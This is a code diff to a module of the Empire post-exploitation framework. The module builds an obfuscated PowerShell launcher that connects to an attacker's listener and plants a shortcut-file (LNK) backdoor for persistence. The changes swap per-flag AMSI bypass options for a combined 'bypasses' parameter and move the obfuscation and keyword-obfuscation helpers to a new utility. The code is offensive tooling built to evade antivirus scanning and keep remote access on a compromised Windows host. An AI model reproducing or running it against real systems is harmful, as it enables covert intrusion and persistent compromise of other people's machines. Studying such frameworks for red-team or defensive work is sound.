@@ -4,6 +4,8 @@ import os
 
 from builtins import str
 from builtins import object
+
+from empire.server.utils import data_util
 from empire.server.common import helpers
 from typing import Dict
 
@@ -15,8 +17,6 @@ class Module(object):
     def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         # Set booleans to false by default
         obfuscate = False
-        amsi_bypass = False
-        amsi_bypass2 = False
 
         listener_name = params['Listener']
 
@@ -35,10 +35,6 @@ class Module(object):
         if (params['Obfuscate']).lower() == 'true':
             obfuscate = True
         obfuscate_command = params['ObfuscateCommand']
-        if (params['AMSIBypass']).lower() == 'true':
-            amsi_bypass = True
-        if (params['AMSIBypass2']).lower() == 'true':
-            amsi_bypass2 = True
 
         status_msg = ""
 
@@ -50,16 +46,16 @@ class Module(object):
         else:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=False,
-                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
-                                                               userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
-                                                               AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
+                                                           obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
+                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
+                                                           bypasses=params['Bypasses'])
             launcher = launcher.replace("$", "`$")
 
 
         # read in the common powerup.ps1 module source code
         module_source = main_menu.installPath + "/data/module_source/persistence/Invoke-BackdoorLNK.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
             module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
             f = open(module_source, 'r')
@@ -105,9 +101,9 @@ class Module(object):
                 else:
                     # generate the PowerShell one-liner with all of the proper options set
                     launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
-                                                                       obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
-                                                                       userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
-                                                                       AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
+                                                                   obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
+                                                                   userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
+                                                                   bypasses=params['Bypasses'])
                     
                     encScript = launcher.split(" ")[-1]
                     status_msg += "using listener " + listener_name
@@ -119,6 +115,6 @@ class Module(object):
         if obfuscate:
             script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
         script += script_end
-        script = helpers.keyword_obfuscation(script)
+        script = data_util.keyword_obfuscation(script)
 
         return script
